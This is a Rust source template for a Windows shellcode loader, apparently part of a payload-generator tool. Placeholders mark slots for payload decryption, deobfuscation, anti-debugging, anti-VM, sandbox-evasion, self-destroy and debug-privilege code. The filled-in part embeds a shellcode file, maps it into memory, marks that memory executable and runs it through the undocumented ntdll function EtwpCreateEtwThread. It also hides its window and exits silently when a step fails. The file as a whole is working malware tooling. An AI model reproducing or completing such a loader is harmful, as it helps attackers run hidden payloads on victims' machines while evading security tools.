#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, HANDLE, WAIT_FAILED};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::WaitForSingleObject;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }

    {{DEOBFUSCATION}}
    {{DECRYPTION}}

    let vec_size = vec.len();

    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            //panic!("[-] LoadLibraryA failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, b"EtwpCreateEtwThread\0".as_ptr());

        let etwp_create_etw_thread: extern "C" fn(*mut c_void, isize) -> HANDLE =
            transmute(fn_etwp_create_etw_thread);

        let addr = VirtualAlloc(
            null(),
            vec_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            //panic!("[-] VirtualAlloc failed: {}!", GetLastError());
            std::process::exit(0);
        }

        copy(vec.as_ptr(), addr.cast(), vec_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, vec_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            //panic!("[-] VirtualProtect failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let thread = etwp_create_etw_thread(addr, 0);
        if thread == 0 {
            //panic!("[-] etwp_create_etw_thread failed: {}!", GetLastError());
            std::process::exit(0);
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}

{{DLL_MAIN}}